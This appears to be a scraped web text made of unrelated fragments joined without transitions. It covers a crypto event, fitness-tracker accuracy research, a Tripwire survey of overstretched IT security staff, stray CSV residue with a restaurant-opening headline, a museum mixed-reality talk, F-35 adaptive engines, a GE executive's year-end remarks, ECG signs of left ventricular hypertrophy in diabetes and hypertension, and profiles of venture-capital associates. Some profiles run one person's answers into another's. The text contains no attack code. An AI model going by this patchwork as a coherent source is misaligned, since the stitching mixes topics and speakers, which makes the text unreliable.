Some Influential Speakers and CEOs were present both physically & virtually to share insightful thoughts on the numerous benefits of cryptocurrency such as Buchi Okoro (Co-Founder/CEO Quidax) Fejiro Hanu Agbodje (Founder/CEO Patricia) Uzoma Dozie (Founder Sparkle) Chimezie Chuta (Founder Blockchain Nigeria User Group) Ruth Iselema (Founder/CEO Bitmama Inc) Emmanuel Babalola (Africa Director Binance & Interim CEO Bundle) to mention a few.

But what does the latest research say about how effective they are?

Fitness trackers are trendy

Currently about one in five Australians own one of these wearables and about a quarter use a mobile app or website to monitor their activity levels and health. And sales are predicted to grow over the next five years.

The landscape of the market is fast changing. For years Fitbit and Garmin were the market leaders. But Australians now favour Apple watches (used by 43% of people owning a wearable tracker) over Fitbit (35%) and Samsung watches (16%) over Garmin (13%).

So far fitness trackers have mostly been taken up by younger people: about one in four Australians aged 20–40 report using one compared to just one in ten people aged 60 or older.

However manufacturers are on a mission to change this by adding features that allow users to monitor not just their fitness activity but several other aspect of their health.

For instance recent wearable models from all the leading manufacturers claim to measure a host of medical metrics such as blood pressure body fat levels the amount of oxygen in your blood your heart activity and even identify when you’ve taken a fall (with a feature that lets you call for help).

Wearables get the basics right

Firstly a multitude of studies have looked at the accuracy of wearable fitness trackers for measurements related to physical activity including step counts heart rate and number of calories burned. They show step counts are generally highly accurate while heart rate and calories burned are reasonably accurate.

When study participants wear two different activity trackers at the same time the numbers of steps minutes of activity and calories burned aren’t exactly the same but they are correlated. That is when one goes up so does the other and vice versa. This suggests they are generally capturing the same information albeit with slightly different sensitivity.

Evidence for sleep tracking is a little patchier. Wearables are pretty good at detecting bed time wake time and overall sleep duration. But estimates for more technical metrics such as the “phases” of sleep – such as REM sleep – don’t marry with medical-grade measurements taken by polysomnography.

Sometimes wearables go beyond the basics

In a 2019 Apple-sponsored study reported in the New England Medical Journal 419297 participants without known atrial fibrillation wore an Apple Watch. During the study 2161 of them received an irregular pulse notification of which 84% were subsequently confirmed to have atrial fibrillation (an irregular and rapid heart beat).

This is a serious medical condition that requires treatment to prevent stroke. The ability to alert users of a potential undiagnosed cardiac condition seems highly beneficial. Although others have cautioned the Apple Watch can also miss cases of undiagnosed atrial fibrillation – which emphasises the importance of never relying on wearable metrics for medical purposes.

Another study published in September reaffirmed the Apple watch’s electrocardiogram feature can detect serious cardiac irregularities. A similar study is currently underway to evaluate Fitbit’s electrocardiogram feature but results aren’t out yet.

Building a more advanced tracker

In terms of detecting falls (which would be very useful for older individuals) scientists are developing wrist-worn devices that can accurately do this using accelerometer technology which is the same underlying technology already used by wearables. So the technology is there but at this point it’s unclear whether the promising lab results will translate to accuracy in commercial wearables.

Meanwhile the newest Samsung watch claims to measure blood pressure and body composition (such as fat mass muscle mass and bone mass). Body composition is measured using a method called bioelectric impedance analysis.

When the user touches the watch with their opposite hand it passes a weak electrical signal through the body and back to the watch. The body composition is then calculated using algorithms and the manually entered body weight.

At this stage there’s no data in the scientific literature to support the accuracy of these measurements so we’d recommend taking them with a pinch of salt. Then again only a few years ago the same criticism was made of electrocardiogram measurements from wearables – and these have subsequently shown to have merit.

Evidence says your effort will pay off

So that’s the run down on accuracy but do fitness trackers make a difference in people’s lives?

Hundreds of studies have used wearable activity trackers to try to increase physical activity in various general and patient populations. Meta-analyses (which involve combining results of multiple studies) suggest the devices are effective in helping people become more physically active and lose weight.

A meta-analysis of 35 studies in various chronic disease populations suggested users added around 2100 additional steps per day after they started using a wearable activity tracker. Other meta-analyses have suggested weight loss in the order of 1 to 1.5 kilograms on average over the duration of the studies (with the duration varying between studies).

And studies that look specifically at step-tracking over long periods suggest the benefits gained are still present (although smaller) up to four years after the device was first worn.

Accuracy and effectiveness aside wearable users typically report being satisfied with their devices. So if you happen to get one in your Christmas stocking this year keep in mind it could help with those New Year’s fitness resolutions.

Tripwire recently conducted a series of surveys and interviews to understand IT professionals who manage security for their company. The cybersecurity landscape is constantly changing new challenges are rapidly emerging and new threats have surfaced especially throughout the pandemic. We were curious to know some of the struggles that security professionals experience as a part of their job. We were especially interested in small to mid-size companies entities which often don’t have the necessary budgets or resources to tackle cybersecurity threats.

Through our inquiries we gained deeper insights about security budgets in different companies as well as insights into what security professionals are like as people what concerns them and what security initiatives they hope to achieve for their company. Here are some of our findings.

When It Comes to Security Recommendations Are Key

When it comes to decisions about which security products to research security professionals rely on product reviews offered by recognized blogs and articles. However recommendations whether from friends colleagues or known experts in the field are also considered valuable. We also asked about the use of social media platforms for professional advancement such as reading articles watching product demonstrations and keeping up with industry news.

LinkedIn was the most used and trusted social media platform while many respondents mentioned Gartner as the first step in researching what security solutions they should be thinking about.

“Sometimes I just go to LinkedIn. My friends might be using another security company and then I will check it out. Aside from LinkedIn checking on Gartner is the easiest way to go. Gartner reviews what is the best event management what next best firewall is etc. Gartner gives a very extensive reviews of these types of products. And friends’ recommendations when I meet them.” Security analyst in a mid-size company

In some companies security is seen as an afterthought and this is often reflected in poor security budgets as well as placing the responsibility on other IT professionals.

Through our research we learned that in some companies and smaller companies especially security is not taken seriously enough. There may not even be a dedicated security role. Instead this job is passed to IT professionals (IT support network or cloud engineers IT managers) who juggle lots of responsibilities which is often hard.

“This is may be my third career down the line and a lot of companies I joined are desperately looking for cybersecurity but there is a lack of talent. This is good for people who are in cybersecurity but also very bad because the rest of us have a lot of shoes to fill and nobody wants to fill them.” System administrator in a mid-size company “We do not have dedicated people managing IT security; this is often demanded of me or another two colleagues. We usually treat security as a side effect.” Cloud engineer in a mid-size company “Too many moving parts and not enough people to cover them. Being a small company I have to wear many hats.” Database analyst in a mid-size company

We also heard that these increased responsibilities could easily lead to burnout.

“It [security landscape] changes all the time so you really have to keep on top of things but along with that comes a lot of stress. And I feel like I had to work very hard to be able to manage that stress especially with it all being on my shoulders. I think that’s a big issue. A lot of security people that I know have burned out relatively quickly. I think that’s a big issue that needs to be talked about more often.” IT director in a small company who acts like a CISO

In the absence of adequate funding for security personnel some companies are trying to show they have a good security posture by promoting non-security staff to more senior security roles. However this comes with a lot of responsibility and pressure. One participant shared that the company offered him the role of CISO but he refused feeling uncomfortable with assuming such an important role while not having the relevant experience.

Participant: “They [the company] offered me a title of a CISO but I refused as I do not feel comfortable being a CISO. I feel like CISOs have at least seven years of prior experience and multiple certifications. And they have worked on multiple projects with different teams and I don’t have that experience.” Interviewer: “What I heard you say is that another person on your team was offered a role of CISO because you didn't feel comfortable taking that role as it comes with a lot of responsibility. The company doesn't have the budget to hire a qualified person for this role. And what I read between the lines is that your company is trying to pretend they have a good security posture.” Participant: “You really hit the nail on the head and I’m not the only one that feels like this. I feel a lot of companies do this. It's a very sad world but that's the truth of a lot of organizations I see.”

When it comes to security budgets the majority of security professionals surveyed reported the budget was adequate (61.1%); however smaller companies were more likely to say their security budget was lacking.

“Management is currently focused on providing resources towards business development and not so much cybersecurity as they don't think a large attack will surface.” Security manager in a mid-size company “Security continues to be an afterthought unfortunately. It's almost just expected and yet no real resources are given to maintain it. Quite frustrating but we do the best we can.” IT administrator in a mid-size company

However this was not true of all small companies. Some reported having a good budget for security and leadership that listens. Unfortunately this was rare and it also depended on whether the organization needs to comply with certain regulationsor wants to attract certain customers as well as who demands to see proof of good cybersecurity practices.

“Depending on the security product we use in our company it depends on the cost and price that is suitable which is followed by the director of the company or the IT manager in my department. In most cases we are able to afford most purchases that will help improve the business structure and security.” IT support engineer in a small company



“We don't actually have a budget. CEO has a high degree of confidence in me and so he knows that when I come to him and say I need something that relates to security he understands that it's something that we need to do. It doesn't mean he won't question me on the price tag but I can pretty much do what I need to do to make sure our company is secure.” IT director in a small company

The pandemic has also affected security budgets yet cyber threats have increased through the pandemic exploiting fear and the uncertainty faced by many companies and private individuals. This has undoubtedly added to workloads yet there is a global shortage of cybersecurity professionals.

“We are a small to mid-size company and we have basic security monitoring solutions in place. Our company offers legal and security services but suffered a lot during COVID-19 and the management has very little budget right now to invest into new services and technology. This is not a priority now.” Cybersecurity analyst in a mid-size company

What Are Security Professionals Like and What Are Their Challenges?

We also explored personality characteristics of security professionals and found that they are highly curious analytical and above all else continuously learning. Cyber threats keep evolving so a large part of the security role is staying on top of new information.

“Security is one of the domains where we have to keep on learning stuff every day. The threat landscape is changing day by day and we can only provide security if we are familiar with the latest news and topics in the industry.” Security manager in a mid-size company

Image

Some participants said that the job comes with an aspect of ambiguity which can be scary. Not always having all the answers or knowing where the next attack will be coming from is a worry for some.

“It feels scary. A lot of days you don't know if you're going to be able to do everything you need. A lot of times you have a lot more questions than answers and I’ve heard from other people in my field that that's a very common thing to feel. It's also challenging because you learn something new every time you tackle a problem so it's just one of those love hate things about the job” System administrator in a mid-size company “I definitely worry daily being responsible for security. Fines can be in the millions of dollars for some companies. So I try to wake up every day and almost scare myself into thinking outside the box. What can I anticipate? How can I improve?” IT director in a small company



Other challenges include not being listened to when it comes to cybersecurity threats and continually advocating for good security practices in their company.

Image

One participant joked about an idea he had to make his company’s leadership take security threats more seriously. While this is a tongue-in-cheek comment it illustrates the frustration that some security professionals experience with threats not being taken seriously in their organizations.



“I had a pretty radical idea. I told my manager: What if we show them [the leadership] the danger? What if we infect their PCs or deface company website? Let’s show them it’s real. He immediately said: 'You’re out of your mind. We can’t do that.' If he was an analyst like me he would have said 'Yes let’s do it.' He’s a lot wiser than me.” Security analyst in a mid-size company

Some security professionals also mentioned struggling to keep up with security improvements due to having so many responsibilities.

“I keep up with mostly job-focused items. I wish I had time for more but I simply don't. It's hugely important to keep up as much as possibleas breaches and other security events affect our clients and we need to know and work to prevent these items but there's just so much of it.” IT manager in a mid-size company “You have to keep up with IT security. I really want to spend more time doing research and hardening our defense but it's hard to manage the time when you're the end-user's first line of support.” IT system specialist in a mid-size company

Feeling Confident that the Company Is Secure

We also asked security professionals to rank suggested categories in order of importance. The majority reported that feeling confident that the company is secure and having the best security solutions were top priorities. Having leadership that understands the value of spending money on security was also key. Many also said that they need to trust the solutions they recommend to their organization because their reputation depends on it. Due to this the process of choosing the right tool can have many steps including checking the reputation of the company providing the solution.

“My job as an IT Admin can be very stressful at times and I have to take many steps to ensure that the products we use are safe and secure and also make sure I maintain all of the security and systems we have at the company. It isn't an easy job. When looking for a new product it would take me a few weeks to make an affirmed decision because I want to ensure that the product that I am signing up for will do the job will hold up to our standards and make sure it's reliable so we don't risk any type of data breaches.” IT administrator in a small company

Some reflected that when shopping for new products it is not only the product that they are testing and shopping for. They are also assessing customer service and support as this signals the type of future relationship they may have with the company that sells the solution.

“I don't think the product with the most expensive price means it's necessarily the best. I feel like my relationship with the company is wildly important and so we ultimately chose a solution that maybe was just a notch below the expectations of the other one but because of the relationship with that company the account executive and their technical support it propelled them into the number one spot.” IT director in a small company

In our interviews we also explored the top concerns for next year. The majority of security professionals we spoke to named data loss prevention as a top goal. This goes hand in hand with Gartner projections. Other big concerns included managing employees and ransomware. Working from home has made securing networks more challenging and employees don’t always understand dangers and signs of social engineering despite ample training.

“Working from home is still a challenge for IT. When people were working in the office we were able to secure the perimeter by hardening the office network. Now the network is expanding to everywhere and we don’t know who else is on the network. So it’s more challenging to harden it and we are trying to achieve zero trust.” Security engineer mid-size company “I hate to say this but really ultimately it's the users [that make company security unpredictable]. You can put all the security mechanisms in place but at the end of the day phishing attempts against users that's where exploits happen where the door is. The more sophisticated that attacks get you can only simulate so much and all it takes is one user to not understand that it is an attempt and you can be in trouble. I’ve seen the rise in phishing text messages which is something that in the past has not really been a thing.” IT director in a small company

Many IT professionals find themselves in a security role without any adequate training or support. Frequently tools that they use are not their first choice and require a lot of set up or rely on manual processes which in an already busy environment can be very time-consuming. Often motivations for getting certain tools differ between leadership and security professionals. While organizations look to cut costs security professionals value tools that automate tasks and save them time.

“We are a very small organization and I have many projects to do. If it [security tool] saves me time I’ll pursue it. From the company side if it saves them money they’ll buy it. Security tools save you money in the future. If it will help us pass infosec review with a potential client and the client will pay us money because we have this tool that’s one thing. But also if the tool saves me time and I can do a better job so we don’t end up having a security breach that will end up costing us money in the future then it has potential.” IT manager in a small company

With the cybersecurity month behind us we all can stop and appreciate how much security professionals really do in order to keep organizations secure and safe from cybercrimes. This job is not easy and often relies on employee cooperation as well as the organization’s vision when it comes to cybersecurity. October was cybersecurity month. Let’s make December cybersecurity professional month and take time to appreciate security professionals for all they do.",https://news.google.com/articles/CBMiU2h0dHBzOi8vd3d3Lmt0bnYuY29tL25ld3MvdGV4YXMtcm9hZGhvdXNlLXRvLW9mZmljaWFsbHktb3Blbi1pbi1oZW5kZXJzb24tb24tbW9uZGF50gEA?hl=en-US&gl=US&ceid=US%3Aen,Texas Roadhouse to officially open in Henderson on Monday,"HENDERSON (KTNV) — Texas Roadhouse is scheduled to officially open its new location in Southern Nevada on Monday evening.

These talks will share why we selected thoughtful and meaningful mixed-reality experiences to make a complex story of Cambodian sculpture understandable.”Attendees will learn what went into Cleveland Museum of Art’s ""Revealing Krishna: Journey to Cambodia’s Sacred Mountain"" which through technology and collaboration reveals the recent restoration of the CMA’s Cambodian masterwork “Krishna Lifting Mount Govardhan.”The talk on the 12th will reveal the technological advances and integration of art and new research used in every stage of the project; many of the players who have had their hand in the exhibition will be there for these discussions.“The talks will also show how we used HoloLens 2 in an unprecedented way where people physically travel instead of remaining stationary guided through time and space and surrounded by holograms” said Alexander. “We will discuss the journey from concept to launch sharing the grit and collaboration that went into the digital experiences from logistics of onboarding the general public to removing barriers of technology so people can dive deeper into the art.”For all those ‘techies’ out there who want to do a deep dive and ask questions to the experts this will be their opportunity while offering helpful insight to the everyday viewer.“I hope everyone will see how thoughtful and authentic every detail of the reconstruction of Krishna is based on carefully researched little-known archaeological evidence” said Sonya Rhie Mace George P. Bickford Curator of Indian and Southeast Asian Art Cleveland Museum of Art. “In this program audiences will see what it takes to restore a broken eroded masterpiece to its original form. We will also show a never-before-released animation of how the approximately two-ton monolith was installed floor to ceiling in a cave temple the entrance of which is shorter than its total height 1500 years ago.”“Revealing Krishna is a very special exhibition"" said Alexander. “The ambitious application of technology in an academic context makes it unique in the museum field. It is an elaborate project requiring many resources that make exhibitions of its kind only possible to do every few years. However interpretive digital will continue to be incorporated into our galleries.”",,,,,,

At least according to preliminary attitudes next-generation engines should be integrated at the end of this decade. They are currently under construction and are known as the Adaptive Engine Transition Program or AETP.

General Electric XA100 and Pratt & Whitney XA101 are the two engines that are part of AETP. The two engines are expected to increase the range of the fighter jet by at least 30% and its stability by at least 40% while reducing fuel combustion by at least a quarter.

The XA100 and XA101 engines should increase the acceleration of the fighters and give more traction. Military engineers say this will be achieved by introducing a third airflow modulated between the engine core and the bypass flow. It is this part of the development that best describes the definition of “adaptive” in the Adaptive Engine Transition Program.

According to data provided by the manufacturers currently available and operating F-35 fighters have a range of about 1350 miles on a single refueling. The XA100 and XA101 engines must increase operational combat capability to at least 1800 miles.

Why is this important?

For the US Air Force as well as its partners the next major conflict could be in the Asia-Pacific theater. Removing the constraints that current engines power the F-35 Lightning II would be essential and would at some point provide an advantage to the Air Force. The military is already talking about increasing the range of fighters as a mandatory feature.

However not only the F-35 will play a significant role in this scenario. Refueling tankers will also come to the fore and they have always been a key factor in planning air combat.

BulgarianMilitary.com has already written about two tankers from the next area which can provide serious support to the F-35 during hostilities. The unmanned aerial vehicle MQ-25A continues with its tests for loading fighters in the air but has already successfully passed the tests for loading two key fighters – F-18 Super Hornet and F-35C. Lockheed Martin’s LMXT is the next next-generation tanker that can load more than one fighter in flight. In addition this air tanker is designed to serve in the air aircraft F-35A F-22 F-16 A-10 B1-B C-17 E-3 E-7 F-15 P- 8A.

Therefore the new F-35 engines would give an advantage over the present in the future – increased range and longer stay in the air means that the United States can lift more aircraft during a conflict while refueling in the air to remain in its traditional indicators.

What are the problems with the current F135 engine?

Currently the Pratt & Whitney F135 engine is mainly installed on most F-35 fighters. For several years analysts test pilots and pilots for F-35 combat missions have been finding excessive wear on the heat shield of the F-35A turbine rotor blades.

Earlier this year it turned out that 46 of the planes were without working engines due to the problem.

There is a third problem that was mentioned years ago by the Chief of Staff of the Air Force General Charles K. Brown Jr. at the time. “F135 engines give up a little faster in certain areas as a result of intensive use and regular deployment. One solution to the problem may be to simply use fewer F-35s” Brown said at the time.

What’s next for the XA100 and XA101 engines?

The engines are under development and testing. In the coming years it will become clear whether they will achieve the set goals and indicators. According to US government officials if these engines pass successful tests not only will the US Air Force replace the old ones with new ones but so will foreign F-35 users.

However the process is complicated. Politicians have yet to do their job through a special bill. There are signals that the start can be made by including the Adaptive Engine Transition Program in the budget expenditures for 2023. However the bill has not yet been passed.

However if this happens the Secretary of the Navy together with the Deputy Minister of Defense for Acquisition and Maintenance will prepare a similar but separate plan to add an “advanced propulsion system” – which could be the final AETP design or an improved version of the AETP. the existing Pratt and Whitney F135 – up to the F-35B with short take-off and vertical landing (STOVL) and the F-35C carrier-based variants again in 2027 at the latest.

Both reports will have to be presented within two weeks of President Joe Biden’s proposal for the 2023 budget.

The costs associated with integrating any new power plants into the three F-35 variants could be significant.

At GE we doubled down on ‘Lean’ as an operating philosophy one that is rooted in continuous improvement with accountability and ownership; we executed our commitments and honoured our partnerships.

This year has seen great momentum on the sustainability and climate change agenda; we witnessed so many countries taking bold ownership in this regard. The UAE’s announcement of Net Zero by 2050 and its recent win to host COP28 is a clear testimony to the level of commitment the UAE leadership is giving to the energy transition dialogue. A dialogue that GE is actively supporting and dedicating its engineers to advance its suite of complementary technology and create innovate solutions needed for energy transformation.

This year has also brought accelerated actions around inclusion and diversity. At GE we adopted the global mindset approach to build a more diverse workforce and a more inclusive workplace. We created chief diversity officer roles within each business we expanded our diversity strategy to include mitigating bias in our talent processes and we transparently report our diversity data globally.

The biggest challenge I would say has been myself always striving to improve what’s around me to do better whether on a work or personal level. Having a desire to learn and to be humble around it is key to grow and develop as a leader – the more you learn the more you realise how little you know. Whatever goal you put upon yourself whatever you want to be be sincere be kind and give it your 100 per cent.

Hence it may take time to find your passion understand that it is a journey that your everyday experiences chisel your character and skills so make it worthwhile. I am excited about 2022 and I look forward to the global economy as it reboots and returns to a new normal. Our outlook for the region is robust we continue to focus on three strategic themes – energy transition precision healthcare and future of flight.

Integrating the power of digitisation and led by a resolve to cut emissions several path-breaking innovations are being developed and are aimed at solving problems from across diverse sectors whether aerospace healthcare or power.

We have learned in the past two years the importance of working together across boundaries and across geographies for the sake of global goals. We know we can only succeed if we work together through private and public sector partnerships through supportive government policies and through diverse and cross functional talents.

[The year] 2022 I hope will strengthen and foster partnerships will build more inclusive communities and workplaces and accelerate technology for a sustainable healthier and more beautiful environment.",,,,,,,,,

In one particularly engaging adventure the Joker and the Penguin joined forces to plot Batman's demise and that got me thinking about how two formidable powers each mighty in its own right can combine to make matters worse.

This is the case for diabetes and hypertension which can work in tandem to worsen left ventricular hypertrophy (LVH). Individually both hypertension and diabetes impose an enormous public health burden and their incidence is rising. Diabetes is estimated to affect approximately 34 million Americans1 while hypertension is estimated to affect 108 million Americans2 nearly half of the adult population in the U.S.

When both of these conditions occur in the same patient the risk of LVH increases considerably.

LVH and Structural Changes in the Heart

Left ventricular hypertrophy develops when the myocardial cells experience growth or hypertrophy resulting in structural changes in the heart. The condition is associated with arrhythmias increased myocardial oxygen demand diastolic dysfunction and heart failure. Individually LVH carries an independent prognosis of adverse cardiac events. It can develop as a result of either diabetes or hypertension; when both are present the adverse manifestations can be compounded.

Many structural changes can take place as a result of hypertension. For example increased filling pressures and hypertension in the heart can go hand in hand with the development of left atrial dilation. The left atrium is often called the ""pressure sensor"" of the heart and when hypertension affects this area LVH left atrial enlargement or degenerative conditions such as right or left bundle branch blocks can occur as sequelae.

Electrocardiographic Correlates of LVH Structural Changes

These structural changes have correlating electrical manifestations on an ECG. These are not necessarily the result of LVH but rather how the ECG propagates through tissue that has changed due to hypertension and diabetes. However ECG alone lacks both sensitivity and specificity for the diagnosis of LVH on echo with the Cornell voltage product criteria being the most sensitive (50%) the Sokolow-Lyon having intermediate sensitivity (29%) and the Romhilt-Estes criteria being the least sensitive (22%). In other words although ECG alone lacks the sensitivity for detection of LVH via echo it measures different aspects of the disease. Both are independently predictive of outcome. In particular ST changes associated with LVH have a poor prognosis and can normalize given proper treatment.

Many of the sequelae such as left atrial enlargement are ""late"" manifestations of LVH that appear once the structural changes have taken hold. However research asserts that ""ventricular activation time in milliseconds on the surface electrocardiogram from the onset of the QRS complex to the peak of the R wave (QR interval) predicts diastolic dysfunction and left ventricular stiffness.""3 This QR interval represents a potentially novel marker for early detection of diastolic dysfunction which can manifest as heart failure a leading cause of death in diabetic patients.

LVH and Diabetes: Molecular and Clinical Implications

Research has identified that the hormone fibroblast growth factor (FGF) 21 is elevated and dysfunctional in diabetics resulting in direct hypertrophy of myocardial cells and LVH in mice4. Research to determine whether blocking the effects of FGF21 can protect diabetic mice from developing LVH is ongoing.

From a clinical perspective the presence of diabetes was found to be associated with a significantly higher left ventricular mass index in a normotensive population compared to age-matched and sex-matched controls in a healthy population. One study suggested the risk was three times greater for diabetics who had type 1 diabetes for an average of more than thirty years.5

Obesity can also play a role in the development of LVH. Elevated BMI is ""significantly associated with LVH"" and the duration and the degree of glycemic control (as reflected by the HbA1c) was also significantly associated with the degree of LVH.6 These findings suggest that all diabetic patients should be considered for LVH screening using all available diagnostic tools especially electrocardiogram and echocardiogram.

ECG for Diabetic Patients

A diabetic patient's ECG readings are critical to both diagnosis and prognosis of LVH. As discussed above ECG changes that suggest LVH as well as abnormalities in the QR interval can provide key information on the disease process for a diabetic patient.

There are many additional nuanced findings on the ECGs of diabetic patients to consider even some that vary by sex. For example in diabetic patients with normal QTc at baseline female sex was associated with a risk of prolonged QTc with the mechanism of QTc prolongation thought to be due to hyperinsulinemia-induced hypoglycemia. ECG can also be used to detect silent ischemia. In the course of diabetes additional alterations such sinus tachycardia changes in heart rate variability and ST-T changes may also be observed.

QT duration has been found to correlate with coronary calcium.7 ECG findings can provide valuable prognostic information for diabetics with both QTc prolongation and ST depression predicting risk of all-cause mortality in type 2 diabetics. QT dispersion can predict not just total mortality but also cardiac and cerebrovascular mortality.

Diabetes and hypertension with their rapidly rising prevalence and incidence are two of the most formidable contributors to heart disease morbidity and mortality. Both can manifest with LVH and diastolic dysfunction and every clinician should stay up-to-date on the diagnostic and prognostic ECG changes associated with diabetes and hypertension. Being well versed in the applicable criteria for this simple bedside tool can help physicians substantially enhance the clinical care of diabetic patients.

I'm particularly interested in the creator economy and am keeping my eye on startups like Astra a digital fashion game by Thrill Digital and Steelo a fashion music and culture SaaS platform founded by Lloyd Okekearu.

I have a generalist approach within B2B SaaS but love to dive into the Future of Work — especially workplace collaboration tools as well as all things ecommerce from web dev to sales enablement tools.

Top tips for breaking into VC?

I personally broke into VC through Future VC an initiative from Diversity VC where candidates receive mentorship and networking opportunities — I would highly recommend!

Dimitri Bilyarchyk investor at Atlantic Labs

My day-to-day focus is on industrial tech robotics and university spinouts in general. But I dig into other sectors too such as machine connectivity battery analytics and last-mile delivery.

I’m keen on themes around industrial digitalisation logistics and digital health. Also independently of sectors I’m passionate about promoting diversity in the startup and VC ecosystem with initiatives such as 2hearts Included.vc and APX’s LGBTQI founder initiative.

Top tips for breaking into VC?

Have a profound understanding of business models and people. Stay up to date with the startup ecosystem and find topics you're passionate about for you to follow closely. Get at least some operational experience at startups and try landing an internship at a fund first. And ultimately build out and leverage your network as much as possible.

Jack Chong campus analyst at Remus Capital

What's your employment background?

Previously I was a serial founder. I built and founded K-12 CMS a recruitment agency and organoid drug testing. I loved ideation rapid prototyping shipping and scaling.

What deals have you worked on so far?

Worked on compliance software ERP systems and carbon footprint tracking.

What sectors are you interested in? Any startups that are catching your eye?

More abstractly I am fascinated by how new waves of infrastructure give rise to new waves of applications. Two waves I think a lot about: sustainability and open banking. Software in sustainability that helps navigate regulatory changes; consumer-facing fintech that automates payment workflow.

Top tips for breaking into VC?

Find good deals! Build build build your alpha. Build a brand expertise or community. Build empathy with founders. Build domain expertise and make non-trivial predictions.

Erik de Stefanis partner at Interlace Ventures

What's your employment background?

When I was in university in Sweden I started a consumer brand with a friend of mine. We ended up raising some external capital for it which introduced me to the world of VC. After graduating I worked at a family office writing smaller cheques into early stage companies but realised quickly that I wanted to join a legitimate fund. I DM’d loads of partners on LinkedIn for coffees which led to an offer to join my current fund.

What deals have you worked on so far?

I wear two hats: I'm on the team at Interlace where we invest in the future of commerce and on the side I run SPVs. I began running SPVs with a Gen Z theme: we'd invest in companies founded by or building for our generation and many of the investors in my SPVs are Gen Z.

A few deals I've worked on that are exciting: FastAF which delivers premium DTC essentials within two hours and Salted a virtual restaurant concept.

What sectors are you interested in? Any startups that are catching your eye?

Future of commerce — tech that enables the brands and retailers we love to become more efficient sustainable and fun. (Treet and Promoted.ai are startups to watch in this area.) The intersection of Web3 and commerce. And consumer tech.

Top tips for breaking into VC?

Get involved in the community: there are plenty of resources online podcasts Slack channels. Talk to people learn what is going on at the moment and meet many entrepreneurs and investors. Also be stubborn: firms care a lot about finding the right person that will fit the team. You might get rejected even after a successful interview. Keep on applying until you find the fund/team that really fits your profile best.

Max Grohmann associate at Creandum

What's your employment background?

Before Creandum I worked in the product team at Airwallex an Australian-Chinese B2B cross-border payments startup in their Hong Kong office.

Spanish FP&A start-up Abacum; a Denmark-based dev tool (not publicly announced yet); and most recently the Yababa deal here in Berlin.

Fintech crypto climate tech and transportation. In terms of startups Vay which is launching a commercial driverless fleet for ride-hailing and car-sharing has in my opinion developed a perfect solution for building the bridge to fully autonomous driving.

Top tips for breaking into VC?

Not sure if it’s a “top” tip — but definitely a small tip that might help: move fast when you see opportunities that interest you! Positions in VC especially entry roles are extremely popular. As soon as positions open up the funnel of applications is filled extremely quickly.

But if you can be one of the first good profiles in the funnel it can definitely improve your chances of being invited to the first round.

Iris Hendriks associate at Creandum

​​What's your employment background?

In my gap year between my bachelor's and master's I led a student consulting organisation where we advised Dutch companies to expand to Indonesia.

I then went on to become a full-time associate.

A stealth mode pre-seed deal in the UK and an unannounced Series B in localisation software.

What sectors are you interested in? Any startups that are catching your eye?

I'm industry agnostic but currently working on different topics from electrification/EVs sustainability and construction to insurance and plant marketplaces. In terms of startups Ready Player Me a full-body avatar platform for the metaverse and Awell which creates digital care pathways in the studio and then implements them in care delivery are two great examples.

Top tips for breaking into VC?

Try to keep updated on a few industries you find exciting: for example know which startups get built in the space which business models excite you and why and check which investors are participating in those rounds. You'll be able to create and articulate a stronger hypothesis/investment thesis and bring up more relevant startups.

What sectors are you interested in? Any startups that are catching your eye?

At Octopus I sit in the fintech team and focus on capital markets climate fintech crypto and financial inclusion. Over the past year I’ve been excited by the climate fintech space. Fintech can be a powerful tool to use transaction flows and data to help consumers and businesses make better choices and push us to a low-carbon economy.

Top tips for breaking into VC?

Even sectors that seem specific like fintech are ubiquitous (if we are to believe Angela Strange) so it’s really important to tap into what excites you the most in the tech landscape. Narrowing down your niche will help demonstrate to prospective funds that you can make an impact and bring insights on day one. It also means you will be best placed to find funds that have similar investment interests to you and where you will be able to thrive. Tech will play a fundamental role in shaping our future — so ask yourself what future do you want to see and what future trends would you like to play a part in building?

Alessandro Kopp senior investment associate at Picus Capital

Personally I am most excited about companies in fintech and B2B SaaS. The potential for fintechs in emerging markets to revolutionise the way people and businesses manage their wealth and finances gives me a great sense of purpose.

Top tips for breaking into VC?

A keen interest in startups is required but becoming an investor also means developing your own hypotheses about industries and business models. Start by keeping up to date with current trends by reading startup news and getting to know which kind of companies excite you.

Madeline Lawrence associate and head of DACH at Peak

What is your employment background?

After finishing my studies in law I got my first taste of the startup scene working in the operations and funds team at Rockstart an early-stage investor based in Amsterdam. I then cofounded a student-run pre-seed venture capital fund called ASIF Ventures — before joining Peak in 2019.

What deals have you worked on so far?

A particular highlight is my first solo deal that I’m about to close (and that hasn’t been announced!). But the startup is pre-seed in the deep tech/B2B/enterprise SaaS arena.

What sectors are you interested in? Any startups that are catching your eye?

I love companies that are able to tackle big legacy incumbent industries. For example Farewill in the UK has shaken up will-writing probate and cremation services with a perfectly fitting consumer experience.

Be creative. There are so many ways to get into VC now: whether it’s working for a portfolio company or having some expertise on a particular topic. Just get your foot in the door and nail those early conversations you have with VCs.

Some include Lovys: a B2C insurtech providing an all-in-one subscription to different insurance products (eg home/pets/car/smartphone insurance). And SESAMm: a B2B fintech leveraging alternative data and AI to provide investment insights and analytics to investment firms.

What sectors are you interested in? Any startups that are catching your eye?

I am interested in fintech and I’m very excited by wealthtech and how tech can help people get control of their finances. Especially now as Gen Zers are already building wealth through side hustles crypto NFTs or investments and are being more proactive in managing their finances. In this space I love how Cleo (UK) is bringing an entertaining and educational approach to financial management.

Top tips for breaking into VC?

Act like a VC before being a VC! Learn about the industries you’d like to invest in by researching the market and talking to people. Develop your own investment thesis and research startups you’d like to invest in that operate in that space. Use LinkedIn Twitter or Slack to connect with like-minded individuals and build relationships.

David Ola associate at Point Nine

What's your employment background?

I studied Human Genetics at university in Dublin and founded a medtech startup while finishing up my degree. I then worked at Seedcamp as an intern before joining Point Nine six months ago.

Why did you join your current fund?

Point Nine’s geography-agnostic approach and work with companies all around the world really excited me — especially being West African and seeing all the recent attention the startup ecosystem there has been receiving.

What deals have you worked on so far?

So far I've been mostly focused on learning and the deals I have supported the team with are still in stealth.

What sectors are you interested in? Any startups that are catching your eye?

No groundbreaking tips here but I think that showing you've really worked hard to understand a specific vertical and can apply that work ethic to getting up to speed with lots of other spaces is a huge plus.

Emily Otterbeck VC at InHealth Ventures

What's your employment background?

After my bachelor's degree I worked in an academic research lab at the Harvard School of Public Health doing cell and animal-based studies in the field of immunometabolism.

